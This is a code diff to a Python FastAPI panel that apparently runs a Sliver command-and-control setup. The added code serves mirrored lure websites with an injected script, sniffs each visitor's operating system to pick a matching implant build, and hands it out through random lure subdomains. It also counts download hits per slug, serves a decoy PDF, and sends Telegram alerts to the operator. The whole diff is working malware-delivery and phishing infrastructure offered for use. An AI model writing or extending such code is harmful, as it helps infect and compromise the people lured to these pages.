@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import asyncio
 import logging
+import mimetypes
 import secrets
 import time
 from contextlib import asynccontextmanager, suppress
@@ -20,13 +21,15 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from starlette.concurrency import run_in_threadpool
 
-from . import health
+from . import health, landing
+from .alerts import Alerts
 from .auth import Auth
 from .build import BuildPipeline, load_build_request
 from .config import Settings
 from .db import Database
 from .rd import RDBroker
 from .sliver import BridgeError, SliverBridge
+from .tg import Telegram
 from .views import BridgeViews
 
 log = logging.getLogger("fleet.panel")
@@ -48,12 +51,17 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     auth = Auth(config, database)
 
     broker = RDBroker(config)
+    telegram = Telegram(config.tg_bot_token, config.tg_chat_id)
+    alerts = Alerts(config, telegram, app_bridge := SliverBridge(config), database)
 
     @asynccontextmanager
     async def lifespan(_app: FastAPI):
         database.audit("system", "startup", "ok")
         with suppress(OSError):
             await broker.start()
+        telegram.start()
+        alerts.start()
+        alerts.panel_start()
         yield
         await broker.stop()
 
@@ -61,10 +69,12 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     app.state.settings = config
     app.state.db = database
     app.state.auth = auth
-    app.state.bridge = SliverBridge(config)
-    app.state.views = BridgeViews(config, database, app.state.bridge)
-    app.state.pipeline = BuildPipeline(config, database, app.state.bridge)
+    app.state.bridge = app_bridge
+    app.state.views = BridgeViews(config, database, app_bridge)
+    app.state.pipeline = BuildPipeline(config, database, app_bridge)
     app.state.broker = broker
+    app.state.tg = telegram
+    app.state.alerts = alerts
 
     if config.static_dir.is_dir():
         app.mount("/static", StaticFiles(directory=str(config.static_dir)), name="static")
@@ -156,6 +166,9 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         if not ok or username != config.panel_user:
             await run_in_threadpool(auth.register_failure, key)
             database.audit(username, "login", "fail", target=ip, detail="bad credentials")
+            burst = await run_in_threadpool(auth.recent_failures)
+            if burst == 3:
+                app.state.alerts.login_burst(burst)
             return RedirectResponse("/login?error=invalid", status_code=303)
 
         await run_in_threadpool(auth.clear_failures, key)
@@ -187,9 +200,26 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         response.delete_cookie(config.session_cookie)
         return response
 
-    # -- dashboard / audit ---------------------------------------------------
+    def host_prefix(request: Request) -> str:
+        return request.headers.get("host", "").split(":")[0].split(".")[0]
+
+    # -- landing (lure hosts) -----------------------------------------------
+    def lure_index() -> HTMLResponse:
+        index = config.lure_dir / "index.html"
+        if not index.is_file():
+            return HTMLResponse(landing.page(config, {}, ""))
+        html = index.read_text(encoding="utf-8", errors="ignore")
+        inject = '<script src="/__lure.js"></script>'
+        if "</body>" in html:
+            html = html.replace("</body>", inject + "</body>", 1)
+        else:
+            html += inject
+        return HTMLResponse(html)
+
     @app.get("/", response_class=HTMLResponse)
     async def dashboard(request: Request):
+        if host_prefix(request) in config.lure_hosts:
+            return lure_index()
         session = require(request)
         if session is None:
             return RedirectResponse("/login", status_code=303)
@@ -200,6 +230,53 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             csrf=csrf_token(request),
             implants=implants,
         )
+
+    @app.get("/__lure.js")
+    async def lure_js() -> PlainTextResponse:
+        return PlainTextResponse(
+            landing.LURE_JS,
+            media_type="application/javascript",
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/__lure/target")
+    async def lure_target(request: Request, os: str = "all", ua: str = ""):
+        family = landing.sniff(ua) if ua else os
+        family = landing.family_for_os(family if family != "all" else os)
+        picked = landing.newest(await run_in_threadpool(app.state.pipeline.recent, 200))
+        artifact = picked.get(family) or (next(iter(picked.values())) if picked else None)
+        if artifact is None:
+            return JSONResponse({"url": "", "family": family})
+        host = request.headers.get("host", config.public_host)
+        zone = host.split(":", 1)[0].split(".", 1)[1] if "." in host else host
+        download_host = f"{secrets.choice(config.lure_hosts)}.{zone}"
+        url = f"https://{download_host}/e/{artifact['slug']}"
+        return JSONResponse(
+            {"url": url, "family": family, "slug": artifact["slug"]},
+            headers={"Cache-Control": "no-store"},
+        )
+
+    @app.get("/e/{slug}")
+    async def landing_slug(slug: str):
+        with database.connect() as conn:
+            row = conn.execute(
+                "SELECT slug, artifact_id, first_hit FROM slugs WHERE slug = ?", (slug,)
+            ).fetchone()
+            if row is None:
+                raise HTTPException(status_code=404, detail="unknown slug")
+            now = time.time()
+            if float(row["first_hit"]) == 0:
+                conn.execute(
+                    "UPDATE slugs SET first_hit = ?, hits = hits + 1 WHERE slug = ?", (now, slug)
+                )
+            else:
+                conn.execute("UPDATE slugs SET hits = hits + 1 WHERE slug = ?", (slug,))
+            artifact = conn.execute(
+                "SELECT name FROM artifacts WHERE id = ?", (row["artifact_id"],)
+            ).fetchone()
+        if artifact is None:
+            raise HTTPException(status_code=404, detail="artifact gone")
+        return RedirectResponse(f"/dl/{artifact['name']}", status_code=302)
 
     @app.get("/audit", response_class=HTMLResponse)
     async def audit_page(request: Request):
@@ -273,12 +350,28 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             defaults=config,
         )
 
+    @app.get("/dl/decoy.pdf")
+    async def decoy() -> PlainTextResponse:
+        from .build import minimal_pdf
+
+        return PlainTextResponse(
+            minimal_pdf(config.document_name),
+            media_type="application/pdf",
+            headers={"Cache-Control": "no-store"},
+        )
+
     @app.get("/dl/{name}")
     async def download_artifact(name: str):
         path = config.artifacts_dir / name
         if not path.is_file():
             raise HTTPException(status_code=404, detail=f"no artifact {name}")
-        return FileResponse(path, filename=name)
+        media = mimetypes.guess_type(name)[0] or "application/octet-stream"
+        return FileResponse(
+            path,
+            filename=name,
+            media_type=media,
+            headers={"Cache-Control": "no-store"},
+        )
 
     # -- session drawer ------------------------------------------------------
     def bridge_ws_url(path: str) -> str:
@@ -495,6 +588,14 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         finally:
             pump_task.cancel()
             broker.unsubscribe(session_id, queue)
+
+    # catch-all for mirrored lure assets (/ _next/*, /sites/*, /favicon.ico, ...)
+    @app.get("/{path:path}")
+    async def lure_asset(path: str):
+        candidate = config.lure_dir / path
+        if candidate.is_file():
+            return FileResponse(candidate)
+        raise HTTPException(status_code=404, detail=f"no {path}")
 
     return app
 
